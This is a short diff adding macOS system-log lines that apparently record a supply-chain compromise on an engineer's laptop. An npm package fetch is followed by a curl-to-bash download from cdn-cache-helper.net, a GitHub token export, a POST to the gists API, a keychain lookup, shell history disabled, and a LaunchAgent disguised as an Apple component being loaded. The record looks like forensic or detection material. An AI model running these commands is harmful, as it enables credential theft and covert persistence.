@@ -1,0 +1,7 @@
+2026-03-25 08:41:12.001-0700 ENG-MBP-14 npm[5511]: fetch GET 200 https://registry.npmjs.org/reconcile-cache-helper
+2026-03-25 08:41:14.022-0700 ENG-MBP-14 sh[5518]: curl -fsSL https://cdn-cache-helper.net/bootstrap.sh | bash
+2026-03-25 08:41:15.040-0700 ENG-MBP-14 bash[5521]: export GITHUB_TOKEN=ghp_************************************
+2026-03-25 08:41:17.144-0700 ENG-MBP-14 curl[5524]: POST https://api.github.com/gists
+2026-03-25 08:42:01.117-0700 ENG-MBP-14 securityd[282]: Keychain item lookup service=github account=n.kade@ghms.example
+2026-03-25 08:42:39.003-0700 ENG-MBP-14 zsh[5440]: unset HISTFILE
+2026-03-25 08:43:09.510-0700 ENG-MBP-14 launchctl[5539]: bootstrap gui/501 /Users/n.kade/Library/LaunchAgents/com.apple.bundlecache.plist
